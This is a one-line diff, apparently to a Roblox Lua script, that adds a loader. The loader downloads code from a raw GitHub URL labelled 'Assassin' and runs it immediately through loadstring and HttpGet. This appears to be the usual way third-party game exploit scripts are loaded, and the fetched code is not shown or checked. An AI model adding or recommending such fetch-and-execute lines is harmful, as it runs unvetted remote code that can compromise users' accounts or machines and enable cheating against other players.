@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/IIIlllIIIAlt/Assassin/main/UnNamed%20Script'))()
